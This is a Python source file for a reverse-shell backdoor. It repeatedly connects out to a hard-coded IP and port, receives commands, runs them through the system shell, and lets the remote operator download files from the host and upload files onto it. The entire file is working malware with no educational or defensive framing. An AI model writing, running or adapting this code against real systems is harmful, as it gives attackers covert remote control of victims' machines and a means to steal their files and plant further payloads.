# /usr/bin/python3

import socket
import subprocess
import marshal 
import os

class backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = False
        while not connected:
            try:
                self.connection.connect((ip, port))
                connected = True
            except ConnectionRefusedError:
                continue
            

    def reliable_send(self, data):
        marshal_data = marshal.dumps(data)
        self.connection.send(marshal_data)

    def reliable_receive(self):
        marshal_data = bytes("".encode())
        while True:
            try:
                marshal_data = marshal_data+self.connection.recv(1024)
                return marshal.loads(marshal_data)
            except EOFError:
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return ("[+]Chaning working directory to "+path).encode()


    def execute_system_command(self,command):
        return subprocess.check_output(command, shell=True)

    def read_file(self, path):
    	with open(path, "rb")as file:
    		return file.read()
    		file.close()

    def write_file(self,path,content):
        with open(path, "wb")as f:
            f.write(content)
            f.close()
            return "[+]Upload Successful"


    def run(self):
        while True:
            #try:
            command = self.reliable_receive()

            if command[0] == "EXIT":
                self.connection.close()
                exit()

            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
                #command_result = ("[+]Chaning working directory").encode()

            elif command[0] == "download":
            	command_result = self.read_file(command[1])

            elif command[0] == "upload":

                command_result = self.write_file(command[1], command[2])

            else:
                command_result = self.execute_system_command(command)

            self.reliable_send(command_result)#.encode())
            #except:
            #    error = 'Error'.encode()
            #    self.reliable_send(error)

Back_door = backdoor("192.168.1.94", 2463)
Back_door.run()